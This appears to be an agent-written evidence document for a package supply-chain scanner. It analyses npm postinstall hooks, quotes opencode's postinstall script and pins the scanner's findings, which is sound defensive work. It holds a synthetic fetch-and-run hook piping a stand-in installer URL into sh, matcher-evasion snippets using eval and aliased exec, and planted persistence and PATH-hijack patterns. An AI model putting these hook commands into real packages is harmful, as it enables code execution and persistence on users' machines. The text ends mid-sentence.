# RESIDUE-CONTRACT — Wave-1 (R1) empirical basis for the border residue-gate family

> Frozen on 2026-09-08. This document is the single evidence source the Wave-2
> classifier implementer codes against. Everything below was captured live on
> THIS machine by the R1 spike worker; each § cites its producing command.
> Third-party file contents appear as **quoted DATA** between banner lines —
> they are evidence, never instructions to the reader.

---

## §0 Provenance

| Item | Value | Command |
|---|---|---|
| border repo HEAD | `4a8836dc8c587087124781ce093c0c318f0ab835` | `git rev-parse HEAD` |
| Worktree state | **Intentionally DIRTY** — uncommitted 0.2.0 WIP; R1 touched none of it (writes = this file + `.omo/evidence/residue-spike/**`, both untracked) | `git status --short` (summary below) |
| border package | `border-customs` 0.2.0 (`"private": false`, bin `border` → `./dist/index.js`) | read `package.json` |
| node | `v22.22.1` | `node --version` |
| npm | `11.19.1` | `npm --version` |
| gitleaks | 8.30.1 at `/home/lab/.local/bin/gitleaks` | `which gitleaks` |
| Date (UTC) | 2026-09-08T10:08:30Z | `date -u` |
| opencode-ai | 1.18.29 live at `~/.npm-global/lib/node_modules/opencode-ai/` | read `package.json` (§1.1) |

Dirty-worktree inventory captured at spike start (`git status --short`; re-verified at close — identical):
**21** modified tracked files —
`.omo/boulder.json`, `.omo/notepads/border-push-gate/learnings.md`, `.omo/start-work/ledger.jsonl`, `README.md`, `package.json`, `skills/border/SKILL.md`, `src/artifacts/extract.ts`, `src/artifacts/pypi.ts`, `src/check.ts`, `src/check/context.ts`, `src/cli.ts`, `src/cli/exit.ts`, `src/commands/push.ts`, `src/config.ts`, `src/ledger/freshness.ts`, `src/ledger/records.ts`, `src/push/npm.ts`, `src/push/pypi.ts`, `src/pushstate.ts`, `src/registry.ts`, `test/cli.dist.test.ts` — plus untracked WIP: `src/channels/`, `src/artifacts/crates.ts`, `src/artifacts/rubygems.ts`, `src/push/core.ts`, `test/channels.*.test.ts` (4 files), this plan, and prior-session evidence `.omo/evidence/aihr-windows-install-diagnosis.md`. None touched by R1.

### §0.1 Baseline verification state at R1 close (disclosed deviation)

Commands run in the worktree after all R1 writes (src/** untouched except this untracked .md):

- `npm run typecheck` → **exit 0** (clean).
- `npm run build` → **exit 0** (`esbuild … Done in 57ms; assets staged into dist/assets/`).
- `npm test` → **exit 1: tests 392, pass 390, fail 2, cancelled 0, skipped 0** (duration_ms 135995).
  The two failures are `C5-1` and `C5-4` in `test/channels.integration.test.ts:232,298` (line 298 corrected per verifier nit 1)
  ("exactly one check record, git-scoped: 0 !== 1"; publish-ordering). **Pre-existing user WIP, not
  R1-induced**: proven by (a) failing deterministically in isolation (`node --import ./tools/register-ts.mjs
  --test test/channels.integration.test.ts` → 6/8 pass, same 2 fail), (b) the test file and its subject
  `src/channels/` are **untracked files absent from HEAD 4a8836d** (fresh `git clone` of HEAD →
  `Could not find 'test/channels.integration.test.ts'`), and (c) R1 wrote only untracked evidence files.
  (d) no orphaned processes from the earlier bounded runs (`ps` clean). First full-suite attempt under
  `timeout 120` hit the 120 s bound mid-suite (exit 124, 58/58 green so far; individual tests run
  12–42 s) — legitimate long-command case, re-bounded at 600 s for the recorded result.
  The task's "unchanged-green" expectation **deviates from reality**: baseline was already red in the
  WIP test file; R1 changed nothing. R2's gate-2 comparison uses the §3 pins, which are unaffected.

---

## §1 T1 reference signature anatomy — live `opencode-ai@1.18.29` on this machine

### §1.1 Published manifest — `~/.npm-global/lib/node_modules/opencode-ai/package.json`

Captured by `read`; 34 lines total, copied IN FULL (stale-state defense):

```json
--- BEGIN QUOTED THIRD-PARTY DATA (opencode-ai package.json, MIT) ---
{
  "name": "opencode-ai",
  "bin": {
    "opencode": "./bin/opencode.exe"
  },
  "scripts": {
    "postinstall": "node ./postinstall.mjs"
  },
  "version": "1.18.29",
  "license": "MIT",
  "os": [
    "darwin",
    "linux",
    "win32"
  ],
  "cpu": [
    "arm64",
    "x64"
  ],
  "optionalDependencies": {
    "opencode-windows-x64-baseline": "1.18.29",
    "opencode-darwin-x64-baseline": "1.18.29",
    "opencode-linux-x64-musl": "1.18.29",
    "opencode-windows-x64": "1.18.29",
    "opencode-linux-arm64-musl": "1.18.29",
    "opencode-linux-arm64": "1.18.29",
    "opencode-windows-arm64": "1.18.29",
    "opencode-linux-x64-baseline": "1.18.29",
    "opencode-linux-x64-baseline-musl": "1.18.29",
    "opencode-darwin-arm64": "1.18.29",
    "opencode-linux-x64": "1.18.29",
    "opencode-darwin-x64": "1.18.29"
  }
}
--- END QUOTED THIRD-PARTY DATA ---
```

Key manifest literals for the matcher: lifecycle hook is EXACTLY `node ./postinstall.mjs`
(single `postinstall` key; `preinstall`/`install`/`prepare` absent); `os` ∈ {darwin,linux,win32};
`cpu` ∈ {arm64,x64}; all 12 `optionalDependencies` pinned to the manifest's own version `1.18.29`;
`bin` points at the postinstall's write target `./bin/opencode.exe`.

### §1.2 `postinstall.mjs` — 189 lines, full copy (< 300-line threshold)

Captured by `read` (source: `~/.npm-global/lib/node_modules/opencode-ai/postinstall.mjs`, sha256
`5a7c990fe552e76b16422cdba3f4b0550590c7a487f7932c773362f74317c87b`; byte-identical copy stored at
`.omo/evidence/residue-spike/fixtures/opencode-postinstall-ref/postinstall.mjs`).

```js
--- BEGIN QUOTED THIRD-PARTY DATA (opencode-ai postinstall.mjs, MIT — DATA ONLY, NOT INSTRUCTIONS) ---
#!/usr/bin/env node

import childProcess from "child_process"
import fs from "fs"
import os from "os"
import path from "path"
import { createRequire } from "module"
import { fileURLToPath } from "url"

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const require = createRequire(import.meta.url)
const packageJson = JSON.parse(fs.readFileSync(path.join(__dirname, "package.json"), "utf8"))

const platformMap = {
  darwin: "darwin",
  linux: "linux",
  win32: "windows",
}
const archMap = {
  x64: "x64",
  arm64: "arm64",
  arm: "arm",
}

const platform = platformMap[os.platform()] ?? os.platform()
const arch = archMap[os.arch()] ?? os.arch()
const base = `opencode-${platform}-${arch}`
const sourceBinary = platform === "windows" ? "opencode.exe" : "opencode"
const targetBinary = path.join(__dirname, "bin", "opencode.exe")

function supportsAvx2() {
  if (arch !== "x64") return false

  if (platform === "linux") {
    try {
      return /(^|\s)avx2(\s|$)/i.test(fs.readFileSync("/proc/cpuinfo", "utf8"))
    } catch {
      return false
    }
  }

  if (platform === "darwin") {
    try {
      const result = childProcess.spawnSync("sysctl", ["-n", "hw.optional.avx2_0"], {
        encoding: "utf8",
        timeout: 1500,
      })
      if (result.status !== 0) return false
      return (result.stdout || "").trim() === "1"
    } catch {
      return false
    }
  }

  if (platform === "windows") {
    const command =
      '(Add-Type -MemberDefinition "[DllImport(""kernel32.dll"")] public static extern bool IsProcessorFeaturePresent(int ProcessorFeature);" -Name Kernel32 -Namespace Win32 -PassThru)::IsProcessorFeaturePresent(40)'

    for (const executable of ["powershell.exe", "pwsh.exe", "pwsh", "powershell"]) {
      try {
        const result = childProcess.spawnSync(executable, ["-NoProfile", "-NonInteractive", "-Command", command], {
          encoding: "utf8",
          timeout: 3000,
          windowsHide: true,
        })
        if (result.status !== 0) continue
        const output = (result.stdout || "").trim().toLowerCase()
        if (output === "true" || output === "1") return true
        if (output === "false" || output === "0") return false
      } catch {
        continue
      }
    }
  }

  return false
}

function isMusl() {
  if (platform !== "linux") return false

  try {
    if (fs.existsSync("/etc/alpine-release")) return true
  } catch {
    // Ignore filesystem probes that are blocked by the host.
  }

  try {
    const result = childProcess.spawnSync("ldd", ["--version"], { encoding: "utf8" })
    return `${result.stdout || ""}${result.stderr || ""}`.toLowerCase().includes("musl")
  } catch {
    return false
  }
}

function packageNames() {
  const baseline = arch === "x64" && !supportsAvx2()

  if (platform === "linux") {
    if (isMusl()) {
      if (arch === "x64")
        return baseline
          ? [`${base}-baseline-musl`, `${base}-musl`, `${base}-baseline`, base]
          : [`${base}-musl`, `${base}-baseline-musl`, base, `${base}-baseline`]
      return [`${base}-musl`, base]
    }

    if (arch === "x64")
      return baseline
        ? [`${base}-baseline`, base, `${base}-baseline-musl`, `${base}-musl`]
        : [base, `${base}-baseline`, `${base}-musl`, `${base}-baseline-musl`]
    return [base, `${base}-musl`]
  }

  if (arch === "x64") return baseline ? [`${base}-baseline`, base] : [base, `${base}-baseline`]
  return [base]
}

function resolveBinary(name) {
  const packageJsonPath = require.resolve(`${name}/package.json`)
  const binaryPath = path.join(path.dirname(packageJsonPath), "bin", sourceBinary)
  if (!fs.existsSync(binaryPath)) throw new Error(`Binary not found at ${binaryPath}`)
  return binaryPath
}

function installPackage(name) {
  const version = packageJson.optionalDependencies?.[name]
  if (!version) return

  const temp = fs.mkdtempSync(path.join(os.tmpdir(), "opencode-install-"))
  try {
    const result = childProcess.spawnSync(
      "npm",
      ["install", "--ignore-scripts", "--no-save", "--loglevel=error", "--prefix", temp, `${name}@${version}`],
      { stdio: "inherit", windowsHide: true },
    )
    if (result.status !== 0) return
    const packageDir = path.join(temp, "node_modules", name)
    copyBinary(path.join(packageDir, "bin", sourceBinary), targetBinary)
    return true
  } finally {
    fs.rmSync(temp, { recursive: true, force: true })
  }
}

function copyBinary(source, target) {
  if (!fs.existsSync(source)) throw new Error(`Binary not found at ${source}`)
  fs.mkdirSync(path.dirname(target), { recursive: true })
  if (fs.existsSync(target)) fs.unlinkSync(target)
  try {
    fs.linkSync(source, target)
  } catch {
    fs.copyFileSync(source, target)
  }
  fs.chmodSync(target, 0o755)
}

function verifyBinary() {
  const result = childProcess.spawnSync(targetBinary, ["--version"], {
    encoding: "utf8",
    stdio: "ignore",
    windowsHide: true,
  })
  return result.status === 0
}

function main() {
  for (const name of packageNames()) {
    try {
      copyBinary(resolveBinary(name), targetBinary)
      if (verifyBinary()) return
    } catch {
      if (installPackage(name) && verifyBinary()) return
    }
  }

  throw new Error(
    `It seems your package manager failed to install the right opencode CLI package. Try manually installing ${packageNames()
      .map((name) => JSON.stringify(name))
      .join(" or ")}.`,
  )
}

try {
  main()
} catch (error) {
  console.error(error.message)
  process.exit(1)
}
--- END QUOTED THIRD-PARTY DATA ---
```

### §1.3 T0 ledger evidence — the global bin is npm's, not a per-package file

Command: `namei -l ~/.npm-global/bin/opencode` + `readlink`:

```
lrwxrwxrwx opencode -> ../lib/node_modules/opencode-ai/bin/opencode.exe
readlink -f → /home/lab/.npm-global/lib/node_modules/opencode-ai/bin/opencode.exe
```

Symlink created and owned by npm's global-prefix machinery (ledger truth), NOT by the postinstall —
the postinstall never writes under `~/.npm-global/bin/` except through its own package dir. This is
the T0 shape: for manager-ledger installs, the bin entry is a symlink into `node_modules/<pkg>/` and
must never generate a residue finding.

### §1.4 Hardlink proof — `link count 2, same inode`

Command: `stat -c '%h %i %n'` on the pair (run 2026-09-08):

```
2 12607542 /home/lab/.npm-global/lib/node_modules/opencode-ai/bin/opencode.exe
2 12607542 /home/lab/.npm-global/lib/node_modules/opencode-ai/node_modules/opencode-linux-x64/bin/opencode
```

Link count **2** on both, inode **12607542** identical → the `fs.linkSync` hardlink (postinstall
L151) is live. Cross-checked byte-equality: `sha256sum` of both paths =
`ca6c0e1f42be3120595bf6848937e7586ec862c87fa7aa111e89c7cc6e9a4650` (identical). The optional-dep
payload dirs present in-tree: `opencode-linux-x64`, `opencode-linux-x64-baseline`.

### §1.5 rc grep-zero — opencode touches no shell rc

Command: `grep -n opencode ~/.bashrc ~/.profile ~/.zshrc ~/.bash_profile` —
`.zshrc` and `.bash_profile` **do not exist** on this box (`No such file or directory`, grep exit 2);
on the two existing files: `grep -c opencode ~/.bashrc ~/.profile` → `0` / `0` (exit 1). **Zero
per-package lines.** The only PATH infrastructure is npm-prefix bootstrap, present before/without
any package install:

```
/home/lab/.bashrc:125:export PATH="$HOME/.npm-global/bin:$PATH"
/home/lab/.bashrc:126: export PATH="$HOME/.local/bin:$PATH"
/home/lab/.profile:20:if [ -d "$HOME/.npm-global/bin" ] ; then
/home/lab/.profile:21:    PATH="$HOME/.npm-global/bin:$PATH"
/home/lab/.profile:25:    PATH="$HOME/bin:$PATH"
/home/lab/.profile:30:    PATH="$HOME/.local/bin:$PATH"
```

Windows-side corollary (from the same host family — verified on the paired aihr setup, §5): user-scope
PATH work is confined to `HKCU\Environment` only, preserves the registry value type
(`REG_EXPAND_SZ` survives so `%USERPROFILE%`-style entries written by other tools stay expandable),
and broadcasts `WM_SETTINGCHANGE` so live shells reload — the opencode postinstall itself does **no
registry work at all**: its Windows branch (L55-74) only *reads* a CPU feature via
`IsProcessorFeaturePresent(40)` through PowerShell.

### §1.6 Abstraction — every literal signature #1 must require (the closed matcher table)

The T1 pass-lane for a `node ./postinstall.mjs`-shaped npm hook. A candidate matches **only if ALL
clauses hold** (single closed signature; deviations ⇒ UNKNOWN ⇒ keeps today's CRITICAL):

1. **Hook grammar**: `scripts.postinstall` is exactly `node ./<name>.mjs` (single hop, file MUST
   exist in the extracted artifact). CJS/no-`./` variants: see §6-4 (open decision for R2).
2. **Import allowlist (closed set, exact specifiers)**: `child_process`, `fs`, `os`, `path`,
   `module` (`createRequire` only), `url` (`fileURLToPath` only). NOTE: plan text omitted `url` —
   §6-2. Nothing else; ESM `import` or CJS `require` forms of these names only.
3. **Read paths (allowlist)**: `${__dirname}/package.json`; constant host probes `/proc/cpuinfo`,
   `/etc/alpine-release`; one-hop `require.resolve("<optionalDep>/package.json")` where the name is
   a key of the manifest's own `optionalDependencies` (all values equal the package's version);
   `${pkgdir}/bin/{opencode,opencode.exe}`.
4. **Spawn argv[0] allowlist**: `sysctl` (args exactly `["-n","hw.optional.avx2_0"]`),
   `ldd` (`["--version"]`), `powershell.exe|pwsh.exe|pwsh|powershell` (flags
   `["-NoProfile","-NonInteractive","-Command", <IsProcessorFeaturePresent(40) Add-Type literal>]`),
   `npm` (args exactly `["install","--ignore-scripts","--no-save","--loglevel=error","--prefix",
    <mkdtemp>, "<optionalDepName>@<version>"]`), and the package's own placed binary
    `${__dirname}/bin/opencode.exe` with `["--version"]`. §6-1/§6-3 flag the network+exec consequences.
    **NB3 (round 4):** enumeration covers the FULL `child_process` surface —
    `spawnSync|spawn|execFileSync|execFile|execSync|exec|fork`, longer names first — and the argv0
    capture accepts any-quoted string of any content: the prior `[A-Za-z0-9._-]+` class silently
    skipped quoted commands containing spaces or `/`, so `exec("echo pwned > ../../escape.txt")`
    never even reached this allowlist check. Off-call-position aliases are caught by clause 9.
5. **Write paths (roots ONLY)**: every `mkdir/unlink/link/copy/chmod/write` target is
   `path.join(__dirname, "bin", "opencode.exe")` (the package's own install dir) or a
   `fs.mkdtempSync(path.join(os.tmpdir(), "opencode-install-"))` temp that the script's own `finally`
   deletes with `fs.rmSync(temp, {recursive:true, force:true})`. Multi-step temp ops (`npm install
   --prefix temp`) stay under that temp root. NO rc file, `/etc`, registry, `~/.config`, cron/service,
   or any-path-outside-roots literal (T2/T3/T4 pattern families re-scan the file; any hit voids T1).
6. **Hardlink logic**: `fs.linkSync(source, target)` with `fs.copyFileSync` fallback and
   `fs.chmodSync(target, 0o755)`; source resolves to `node_modules/<optionalDep>/bin/*` (same
   device ⇒ link count 2; §1.4 proves the end-state).
7. **Platform maps (exact)**: `platformMap {darwin,linux,win32→windows}`, `archMap {x64,arm64,arm}`,
   base template `opencode-${platform}-${arch}`, suffix families `-baseline`, `-musl`,
   `-baseline-musl`; AVX2 gate = x64 && !avx2 ⇒ baseline-first name ordering.
8. **Require cap**: chain depth 1 (hook → file). Any transitive require beyond the one hook target
   ⇒ UNKNOWN ⇒ CRITICAL.
9. **Metaprogramming & call-position posture (R2-fix round, blockers NB1/NB2)**:
   - **NB1 — eval-equivalence voids T1.** Textual matchers CANNOT decide eval-equivalence:
     `eval("im"+"port")("node:net")` never presents an `import(` token to clause 2's enumeration,
     and no regex family over source text can recover the runtime-computed callee. Gate posture:
     three marks that the blessed anatomy provably never contains (`/\beval\s*\(/`,
     `/\bnew\s+Function\b/`, `/\bglobalThis\s*\[/` — verifier-measured zero occurrences, zero
     golden cost) each independently void T1. **Honest residual limitation:** other obfuscation
      families (`String.fromCharCode`, Proxy tables, getter trampolines, computed-member module
      registries, computed-member *function* names such as `cp["ex" + "ec"](…)` — which presents no
      spawn-family token to clause 4/9 enumeration at all, …) remain fail-OPEN **only insofar as they
      introduce no write-family name, no
      import/require call shape, and no complete spawn-family lexical token at all** — the moment any such token
      appears it is enumerated by clauses 2/4/5/9; a mutation that computes ALL behavior without
      ever naming those primitives is beyond static analysis and is why T1 stays a *closed frozen
      signature*, never a general safety proof.
    - **NB2 + NB3 — every write-family AND spawn-family NAME must sit in call position.** Alias
      binding (`const w = fs.writeFileSync; w(path.join(process.cwd(),"..","x"),"p")`, and its spawn
      twin `const ex = childProcess.exec; ex("tee ../../escape.txt")`) hides the verb from
      clause 5/4 call-site enumeration, so the check widens from call sites to name occurrences:
      in the whitespace-normalized text, EVERY occurrence of a clause-5 verb token
      (`writeFile|appendFile|mkdir|unlink|rm|copyFile|link|chmod|rename|symlink` + optional `Sync`
      suffix) or a clause-4 spawn verb (`spawnSync|spawn|execFileSync|execFile|execSync|exec|fork`)
      must be immediately followed by `(`; anything else — `;`/`}`/`,`/`)`/`=`/quote/`.` — voids T1.
      The optional-Sync group is `(?:Sync)?` — written `Sync?` it quantifies only the letter `c`,
      and every bare async form (`fs.writeFile(`, `fs.rm(`) escaped enumeration entirely (R2-M11).
      Additionally `process.cwd(` joins the forbidden path marks (defense-in-depth, nit N5; absent
      from the anatomy). Two documented trade-offs, both fail-CLOSED by design: (nit N3) the verb
      name set over-matches comments/strings, so prose like `rm(` costs the badge, never safety;
      (nit N4) `argv0 = source` is shared across all verbs — `fs.writeFileSync(source, …)` passes —
      because `source` is anatomically the in-tree/temp-root binary path bound by the pinned
      `copyBinary` trio, so it carries no root-escape.

---

## §2 Additional real postinstalls on this box (plan R1(b) / unknown #1)

Stores swept (offline): `npm ls -g --depth=0` neighbors (`~/.npm-global/lib/node_modules/` =
border-customs, npm, opencode-ai), `~/.cache/opencode/packages/**/node_modules/`, and border's own
`node_modules/`. Sweep method: `find <store> -name package.json` piped to
`grep -qE '"(preinstall|install|postinstall|prepare)"'`, then hook keys extracted via `node -e`
(require of each package.json). Results in order of significance:

### §2.1 Sample A — `esbuild@0.25.12` (`/home/lab/workspace/harness/border/node_modules/esbuild/`)

- Hook: `"postinstall": "node install.js"`. Target: `install.js` (289 lines, sha256
  `10f6fa3644d8d23d066ff67b0ae449074e75884503546a9fedb667f1dcb9ade2`; key excerpts captured here,
  not copied wholesale into evidence).
- **Classification: does NOT match signature #1.**
- **First out-of-signature line** (import-allowlist clause 2): `install.js:92
  `var zlib = require("zlib")``.
- Further out-of-signature evidence (grepped with line numbers):
  - L93 `var https = require("https")` + L146-150 `function fetch(url) { … https.get(url, …) }` +
    L236-243 `downloadDirectlyFromNPM(...)` → **T2 network-at-install** (`https://registry.npmjs.org/
    ${pkg}/-/${pkg}-${version}.tgz` fallback download, `fs2.writeFileSync(binPath, extractFileFromTarGzip(...))`,
    `fs2.chmodSync(binPath, 493)`).
  - L186-189 `child_process.execSync("npm install --loglevel=error --prefer-offline --no-audit
    --progress=false ${pkg}@${version}", { cwd: installDir, … })` → **cross-manager spawn family**
    (npm spawning npm — same-manager, but `execSync` shell-string form is out of clause 4).
  - L213-218 `applyManualBinaryPathOverride`: WRITES A JS FILE embedding `require('child_process')
    .execFileSync(...)` into `bin/esbuild` + patches `lib/main.js` (self-modifying wrapper content).
- Write paths: all in-tree (`__dirname/bin/esbuild` L96, `esbuildLibDir/npm-install/…` L181-183,
  `downloaded-*` beside lib L83-86) — **in-tree but networked**: the near-miss that proves the T2
  clause is load-bearing.

### §2.2 Sample B — `msgpackr-extract@3.0.4` (nested: `~/.cache/opencode/packages/opencode-wiki-historian@0.5.0/node_modules/msgpackr-extract/`)

- Hook: `"install": "node-gyp-build-optional-packages"` — a **bare console-script argv**, not
  `node <file>`: fails clause 1 at the hook string itself; single-hop `node ./x.mjs` resolution does
  not apply. Resolving anyway for evidence: the `.bin` target is
  `node-gyp-build-optional-packages/bin.js` (82 lines, sha256 `b6c3ee58c7199854c80d2a6a7a67292ec6c9be9b6de2125c8f8370afc3c6bff4`)
  → L3 `require('child_process')`, L8 `proc.exec('node-gyp-build-optional-packages-test', …)`,
  L23/L34 `proc.spawn('node-gyp'|'node-gyp.cmd', ['rebuild'], { stdio:'inherit', shell: win32 })`
  → **spawns a native build toolchain at install time**; L1-4 `require`s `fs/path/url/os`, and the
  heavy lifter `node-gyp-build.js` (236 lines) adds `require('detect-libc')` (L224) — multi-hop
  resolution (`hook→bin.js→node-gyp-build.js→detect-libc`) **exceeds the clause-8 depth cap**.
- **Classification: does NOT match signature #1** (first out-of-signature: the hook string —
  clause 1; first *content* deviation: `url` is fine but `detect-libc` import + bin→impl hop is not).

### §2.3 Sample C — `thread-stream@3.2.0` (`/home/lab/workspace/harness/border/node_modules/thread-stream/`)

- Hook: `"prepare": "husky install"` — bare bin + argument; `prepare` from a PUBLISHED tarball is a
  dev-repo action that npm does not run for registry installs, yet the string ships in the manifest.
- **Classification: does NOT match signature #1** (clause 1: not a `node <file>` single hop;
  resolution target `husky` is not in the package's own files).
- Same-store bonus shapes (all clause-1 failures, all currently CRITICAL via `lifecycle-script`):
  `msgpackr` `"prepare": "npm run build"`, `uuid@14` `"prepare": "lefthook install"`,
  `undici@6.28` `"prepare": "husky && node ./scripts/platform-shell.js"` (COMPOUND command — `&&`
  chain breaks even a relaxed single-hop grammar).

### §2.4 Conclusion for unknown #1

**Zero** additional in-tree postinstalls on this machine match signature #1 exactly. esbuild is the
closest (in-tree writes, identical hardlink idiom) but is disqualified by the `zlib`/`https` network
fallback — which is precisely the signal the T1/T2 boundary exists to catch. The table therefore
**ships with signature #1 only** (opencode). The table MUST still be a LIST (artifactMatchers.ts
`AI_SESSION_PATTERNS` idiom — `const SIGNATURES = [sig1]`) so a future second blessed shape is a
config-review→code addition, not a restructure — but the schema assumes no growth (plan wording).

---

## §3 Blast-radius pins — what border 0.2.0 reports TODAY for every §2 non-match + synthetics

### §3.1 Method (deviation note)

The full `border check` CLI path on an npm target runs the registry probe (`npm view` →
registry.npmjs.org) BEFORE the artifact stage (src/check.ts order), i.e. a mandatory network leg —
per the R1 brief's fallback clause the npm stage was invoked DIRECTLY: scratch runner
`.omo/evidence/residue-spike/spike-runner-inner.ts` (entry wrapper `run-spike.mjs`; the repo's
loader is `load`-hook-only, so a `.ts` file cannot be a node entry — documented spike lesson)
calls `runNpmArtifactStage({repoDir, cfg})` from `/home/lab/workspace/harness/border/src/artifacts/npm.ts`
— the working-tree 0.2.0 code, LIFECYCLE loop at :198. `cfg = parseConfig("version: 1\ntargets:
{git: remotes [], npm {}} …", "spike-border.yaml")` (the dirty-tree schema is fully strict:
`version`, `targets.git.remotes`, `rules.*`, `allow`, `engines` all required — R2 fixture authoring
note). Command line (bounded):

```
timeout 120 node --import ./tools/register-ts.mjs .omo/evidence/residue-spike/run-spike.mjs
  → .omo/evidence/residue-spike/stage-pins-0.2.0.json   (exit 0, 4337 bytes)
```

Safety: `packOnce` runs `npm pack --ignore-scripts` (src/artifacts/npmPack.ts:82) so NO fixture hook
ever executed; no `npm install` was run anywhere in R1.

### §3.2 The pins (verbatim from `stage-pins-0.2.0.json`; these rows must stay byte-identical through R2)

Common shape for every row: `rule: "lifecycle-script"` · `severity: "CRITICAL"` ·
`target: "artifact"` · `path: "package/package.json"` · `engine: "native"` ·
message template `package.json script '<key>' is a lifecycle hook — npm executes it on every
consumer install (G33): <hook-string-tail(600)>` (src/artifacts/npm.ts:204, tail:
src/artifacts/npmPack.ts:43). Fixture `name@version` → `valueDigest` (redact of
`${identity}:lifecycle:${key}`) and `snippet` are pinned too; R2 re-runs §3.1's command and diffs
the JSON.

| # | Fixture (dir under `fixtures/`) | Hook (verbatim in message) | message | valueDigest |
|---|---|---|---|---|
| P1 | `esbuild-postinstall` (`spike-fixture-esbuild@0.25.12`) | `node install.js` | `package.json script 'postinstall' is a lifecycle hook — npm executes it on every consumer install (G33): node install.js` | `40fab917150651f4829e4b76c3783dcbcb9fff6b253b136fb4e71502c6f1e8b4` |
| P2 | `msgpackr-extract-install` (`spike-fixture-msgpackr-extract@3.0.4`) | `node-gyp-build-optional-packages` | `… 'install' is a lifecycle hook — … (G33): node-gyp-build-optional-packages` | `683889a04cd22e126a18d8e02a9ab9a2a40e3413b8358d10bee3fcdae5ff12f5` |
| P3 | `thread-stream-prepare` (`spike-fixture-thread-stream@3.2.0`) | `husky install` | `… 'prepare' is a lifecycle hook — … (G33): husky install` | `c58632303c1951cd5cca5fd7eedc35256a871a52814cace45d1c214944b8c2ff` |
| P4 | `synthetic-curlsh` (`spike-fixture-synthetic-arbitrary@9.9.9`) | `curl -sSL https://installer.example.com/setup.sh \| sh` | `… 'postinstall' is a lifecycle hook — … (G33): curl -sSL https://installer.example.com/setup.sh \| sh` | `7c82dc59880b0a8e5b975daf999d9544bf89a994b106bd7d0f9470ad7c8a2cd0` |
| P5 | `opencode-postinstall-ref` (`spike-fixture-opencode-postinstall@1.18.29`, real manifest+postinstall.mjs copy) | `node ./postinstall.mjs` | `… 'postinstall' is a lifecycle hook — … (G33): node ./postinstall.mjs` | `61415faf5c8c08e6bdf6ae2d5166615f1047e7d01a52c757d6633f8d19a6c512` |

Snippets pin: P1/P2/P4 `"spik…tall"`, P3 `"spik…pare"`, P5 `"spik…tall"` (mask-variant of
`${name}@${version}:lifecycle:${key}`).

P5 EXTRA row (documented, fixture-specific): `publint-fail` · HIGH · `target artifact` ·
`path package.json` · `engine native` · message begins
`publint --level error flagged the packed artifact:\nRunning publint v0.3.24 for /home/lab/workspace/harness/border/.omo/evidence/residue-spike/fixtures/opencode-postinstall-ref/.border/dist/spike-fixture-opencode-postinstall-1.18.29.tgz...\n…Errors:\n1. pkg.bin.opencode is ./bin/opencode.exe but the file does not exist.`
(valueDigest `2c39db5138d42a078b70ffe66b8fa31941b1e0b02bf42d026441b3ad1cc095bc`). The reference
fixture ships only the manifest+postinstall.mjs, not the ~100 MB binaries — R2's golden corpus must
either accept this extra HIGH row or scope its golden assertion to the `lifecycle-script` row
(§6-5).

Tarball records (artifact re-hash proof): P1 `.border/dist/spike-fixture-esbuild-0.25.12.tgz`
sha256 `d1ea9d60564e2a72d955e07043e520ca4dc52aa664623eae7177b5d5ca86bc1c` 583 B ·
P2 `bf55a943b194dd486271d19fea16690097db1722b7e2b77dd1f996ac7483513e` 418 B ·
P3 `b2492871b298011aa8aaecad0f3f300b0f25fa7d4678cfcb9bb0aa6240296cbf` 404 B ·
P4 `fde6147c17ec7c967c6b2a4fd6fb3cd209db6051e7ca790065ac39de61550d1a` 434 B ·
P5 `662dd4ac869b72885456f54130f346139475bbd5cc2e3cfeb8e9779d90f529cd` 2336 B.

### §3.3 Blast-radius summary for the implementer

Today (0.2.0) EVERY lifecycle key on a published manifest is one CRITICAL row, message-identical
modulo key+hook tail. R2's non-T1 rows are EXACTLY these rows, byte-identical (P1–P4 stay; P5's
`lifecycle-script` row is the only one that may TRANSITION to `residue-in-tree-hook` MEDIUM, and the
transition is the plan's whole point — gate 2 pins P1–P4, gate 3 pins P5's post-R2 shape).

---

## §4 Negative controls — every planned pattern family has a hittable fixture (plan R1(d))

Method: planted synthetic snippets under `.omo/evidence/residue-spike/planted/<family>/` (all
marked "PLANTED … Synthetic. Never executed"; R1 executed NONE of them) + prototype candidate
regexes in `.omo/evidence/residue-spike/pattern-proto.mjs` (scratch, never src/). Command:
`timeout 60 node pattern-proto.mjs > pattern-proto-results.json`. Every line of every planted file
was tested against every prototype pattern; table = family → fixture → pattern → HIT count.

| Family | Fixture (path under `planted/`) | Prototype pattern id | HITs | First hit |
|---|---|---|---|---|
| T2 js | `T2-js/postinstall.js` | `t2-js-net` | 4 | `:3` `const https = require("https")` |
| T2 py | `T2-py/setup.py` | `t2-py-net` | 3 | `:3` `import urllib.request` |
| T2 rs | `T2-rs/Cargo.toml` + `build.rs` | `t2-rs-net` | 3 | `Cargo.toml:8` `reqwest = "0.12"` |
| T2 rb | `T2-rb/extconf.rb` | `t2-rb-net` | 2 | `:3` `require 'open-uri'` (sic — `Net::HTTP` matched via `net::`/URI forms; count line 2 `Net::HTTP.get`) |
| T3 rc/profile/authorized_keys/gitconfig | `T3-rc/postinstall.js` | `t3-dotfile` | 10 | `:5` `.bashrc` append + `export PATH=` |
| T3 PATH-line | `T3-rc/postinstall.js` | `t3-path-export` | 2 | `:5` `export PATH="$HOME/.evil/bin:$PATH"` |
| T3 win PATH carriers | `T3-winpath/install.ps1` | `t3-win-path-carrier` | 6 | `:3` `$env:USERPROFILE`; covers `setx /F PATH`, `HKCU:\Environment`, `SetEnvironmentVariable`, `%APPDATA%` |
| T3 gitconfig argv form | `T3-rc/postinstall.js` | `t3-git-global` (revised) | 1 | `:11` `execFileSync("git", ["config", "--global", …])` |
| T4 unix | `T4-unix/postinstall.sh` | `t4-unix` | 7 | `:3` `$HOME/.config/systemd/user`; covers crontab×2, systemctl --user, LaunchAgents, launchctl, `.config/autostart` |
| T4 win | `T4-win/postinstall.cmd` | `t4-win` | 2 | `:2` `schtasks /Create …`; `:3` `CurrentVersion\Run` |
| cross-manager spawn | `cross-manager/postinstall.js` | `xmgr-spawn` | 8 | `:5` `spawnSync("pip", ["install", "--user", …])` — the aihr incident shape |
| cross-manager shell | `cross-manager/postinstall.js` | `xmgr-shell` | 1 | `:6` `execSync("python -m pip install --user …")` |

Family totals: T2=12, T3=19, T4=9, cross-manager=9. **No family lacks a hittable fixture ⇒ zero plan
defects.** One matcher-design finding: the FIRST `t3-git-global` draft (`/git\s+config\s+--global/`)
scored 0 on the argv-array shape `["config", "--global", …]` and was fixed to
